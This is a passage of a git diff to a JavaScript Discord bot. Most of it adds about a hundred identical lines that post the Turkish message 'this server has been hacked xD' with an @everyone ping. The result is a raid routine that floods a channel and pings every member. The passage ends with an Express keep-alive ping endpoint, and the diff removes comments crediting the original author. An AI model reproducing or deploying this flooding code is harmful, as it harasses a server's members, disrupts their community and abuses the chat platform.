+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
@@ -4066,7 +17791,7 @@ const app = express();
   }    
 }
 app.get("/", (request, response) => {
-  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
+  console.log(Date.now() + " Ping tamamdır.");  
   response.sendStatus(200);
 });
 app.listen(process.env.PORT);
@@ -4075,4 +17800,3 @@ setInterval(() => {
 }, 3000);
 
 
-//TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryoutube VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
